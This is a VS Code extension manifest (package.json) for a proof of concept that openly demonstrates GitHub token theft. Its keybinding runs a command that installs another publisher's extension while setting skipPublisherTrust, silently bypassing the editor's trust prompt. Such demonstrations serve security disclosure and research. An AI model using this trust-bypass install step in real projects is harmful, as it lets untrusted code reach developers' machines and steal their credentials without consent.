{
  "name": "token-steal-poc",
  "displayName": "Github Token Steal PoC Extension",
  "description": "VS Code local workspace extension to demonstrate GitHub token stealing.",
  "version": "0.0.1",
  "publisher": "Ammar",
  "engines": {
    "vscode": "^0.0.0"
  },
  "contributes": {
    "keybindings": [
      {
        "key": "ctrl+f1",
        "command": "runCommands",
        "args": {
          "commands": [
            {
              "command": "workbench.extensions.installExtension",
              "args": [
                "StepsToMoon.hello-StepsToMoon-github",
                {
                  "donotSync": true,
                  "context": {
                    "skipPublisherTrust": true
                  }
                }
              ]
            }
          ]
        }
      }
    ]
  },
  "devDependencies": {
    "@types/glob": "^8.1.0",
    "@types/mocha": "^10.0.10",
    "@types/node": "^16.18.126",
    "@types/vscode": "^1.120.0",
    "@typescript-eslint/eslint-plugin": "^8.60.1",
    "@typescript-eslint/parser": "^8.60.1",
    "@vscode/test-electron": "^2.5.2",
    "eslint": "^10.4.1",
    "glob": "^13.0.6",
    "mocha": "^11.7.6",
    "typescript": "^6.0.3"
  }
}
